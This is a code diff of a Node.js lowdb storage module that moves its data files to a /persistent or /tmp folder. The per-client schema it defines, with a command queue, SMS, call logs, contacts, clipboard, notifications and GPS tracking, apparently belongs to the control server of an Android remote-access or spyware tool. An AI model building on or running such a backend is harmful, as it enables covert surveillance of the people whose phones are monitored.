@@ -3,75 +3,56 @@ const FileSync = require('lowdb/adapters/FileSync');
 const path = require('path');
 const fs = require('fs');
 
-// Helper: ensure directory exists
-function ensureDir(dir) {
-    if (!fs.existsSync(dir)) {
-        fs.mkdirSync(dir, { recursive: true });
-    }
+// Choose persistent dir if available, else /tmp
+const writableDir = fs.existsSync('/persistent') ? '/persistent' : '/tmp';
+
+// Ensure subfolders exist
+if (!fs.existsSync(writableDir)) fs.mkdirSync(writableDir);
+if (!fs.existsSync(path.join(writableDir, 'clientData'))) {
+  fs.mkdirSync(path.join(writableDir, 'clientData'));
 }
 
-// Helper: choose writable location
-function getWritablePath(relativePath) {
-    const cwdPath = path.join(process.cwd(), relativePath);
-    try {
-        fs.accessSync(path.dirname(cwdPath), fs.constants.W_OK);
-        return cwdPath;
-    } catch {
-        const tmpPath = path.join('/tmp', relativePath);
-        ensureDir(path.dirname(tmpPath));
-        if (!fs.existsSync(tmpPath)) {
-            fs.writeFileSync(tmpPath, '{}');
-        }
-        return tmpPath;
-    }
-}
-
-// Main DB
-const adapter = new FileSync(getWritablePath('maindb.json'));
+const mainDbPath = path.join(writableDir, 'maindb.json');
+const adapter = new FileSync(mainDbPath);
 const db = lowdb(adapter);
 
 db.defaults({
-    admin: {
-        username: 'admin',
-        password: '',
-        loginToken: '',
-        logs: [],
-        ipLog: []
-    },
-    clients: []
+  admin: {
+    username: 'admin',
+    password: '',
+    loginToken: '',
+    logs: [],
+    ipLog: []
+  },
+  clients: []
 }).write();
 
-// Client DB class
 class clientdb {
-    constructor(clientID) {
-        const clientPath = getWritablePath(`clientData/${clientID}.json`);
-        const cdb = lowdb(new FileSync(clientPath));
-
-        cdb.defaults({
-            clientID,
-            CommandQue: [],
-            SMSData: [],
-            CallData: [],
-            contacts: [],
-            wifiNow: [],
-            wifiLog: [],
-            clipboardLog: [],
-            notificationLog: [],
-            enabledPermissions: [],
-            apps: [],
-            GPSData: [],
-            GPSSettings: {
-                updateFrequency: 0
-            },
-            downloads: [],
-            currentFolder: []
-        }).write();
-
-        return cdb;
-    }
+  constructor(clientID) {
+    const clientDbPath = path.join(writableDir, 'clientData', `${clientID}.json`);
+    const cdb = lowdb(new FileSync(clientDbPath));
+    cdb.defaults({
+      clientID,
+      CommandQue: [],
+      SMSData: [],
+      CallData: [],
+      contacts: [],
+      wifiNow: [],
+      wifiLog: [],
+      clipboardLog: [],
+      notificationLog: [],
+      enabledPermissions: [],
+      apps: [],
+      GPSData: [],
+      GPSSettings: { updateFrequency: 0 },
+      downloads: [],
+      currentFolder: []
+    }).write();
+    return cdb;
+  }
 }
 
 module.exports = {
-    maindb: db,
-    clientdb: clientdb,
+  maindb: db,
+  clientdb: clientdb,
 };
